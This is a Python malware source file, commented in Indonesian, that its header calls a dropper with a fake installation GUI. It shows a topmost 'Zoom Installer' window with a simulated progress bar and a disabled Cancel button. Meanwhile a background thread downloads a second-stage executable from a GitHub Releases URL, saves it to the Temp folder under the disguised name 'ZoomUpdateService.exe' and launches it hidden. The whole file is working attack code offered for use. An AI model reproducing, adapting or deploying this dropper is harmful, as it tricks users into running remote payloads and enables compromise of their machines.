# dropper_installer.py - Dropper dengan GUI instalasi palsu, ditulis dalam Python.
# Ini adalah pengganti yang andal untuk versi Nim dan AHK.

import tkinter as tk
from tkinter import ttk
import threading
import time
import requests
import subprocess
import os
import sys

# --- Konfigurasi ---
# URL ke payload utama Anda di GitHub Releases
STAGE2_URL = "https://github.com/GlgApr/release-gang/releases/download/test/Zoom_V5_TweakCloudflared.exe"
# Nama file saat disimpan di folder Temp
STAGE2_FILENAME = "ZoomUpdateService.exe"

class FakeInstallerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Zoom Installer")
        self.root.geometry("450x200")
        self.root.resizable(False, False)
        
        # Atur agar jendela selalu di atas
        self.root.attributes('-topmost', True)

        # Label utama
        self.label = ttk.Label(root, text="Preparing installation...", font=("Helvetica", 12))
        self.label.pack(pady=20, padx=20)

        # Progress bar
        self.progress = ttk.Progressbar(root, orient="horizontal", length=400, mode="determinate")
        self.progress.pack(pady=10)

        # Tombol Cancel (dinonaktifkan)
        self.cancel_button = ttk.Button(root, text="Cancel", state="disabled")
        self.cancel_button.pack(pady=10)

        # Mulai proses di thread terpisah agar GUI tidak macet
        self.start_background_process()

    def start_background_process(self):
        """Menjalankan proses download dan animasi di thread terpisah."""
        # Thread untuk download dan eksekusi
        download_thread = threading.Thread(target=self.download_and_execute, daemon=True)
        download_thread.start()

        # Thread untuk animasi progress bar
        progress_thread = threading.Thread(target=self.run_progress_bar, daemon=True)
        progress_thread.start()

    def download_and_execute(self):
        """Mengunduh dan menjalankan payload utama."""
        try:
            # Dapatkan path folder Temp
            temp_dir = os.environ.get("TEMP")
            file_path = os.path.join(temp_dir, STAGE2_FILENAME)

            # Kirim permintaan untuk mengunduh file
            response = requests.get(STAGE2_URL, stream=True)
            response.raise_for_status() # Akan error jika status code bukan 200

            # Tulis file ke disk
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            # Jalankan payload secara tersembunyi
            # Gunakan STARTUPINFO untuk memastikan tidak ada jendela konsol yang muncul
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([file_path], startupinfo=startupinfo)

        except Exception as e:
            # Jika gagal, tidak melakukan apa-apa dan keluar diam-diam
            print(f"Error during download/execution: {e}")

    def run_progress_bar(self):
        """Mensimulasikan proses instalasi."""
        for i in range(101):
            self.progress['value'] = i
            if i < 30:
                self.label.config(text="Contacting servers...")
            elif i < 70:
                self.label.config(text="Downloading components...")
            elif i < 95:
                self.label.config(text="Finalizing installation...")
            else:
                self.label.config(text="Installation successful!")
            
            time.sleep(0.1) # Jeda animasi

        # Tutup jendela setelah selesai
        self.root.after(1000, self.root.destroy)

def main():
    root = tk.Tk()
    app = FakeInstallerGUI(root)
    root.mainloop()

if __name__ == '__main__':
    main()

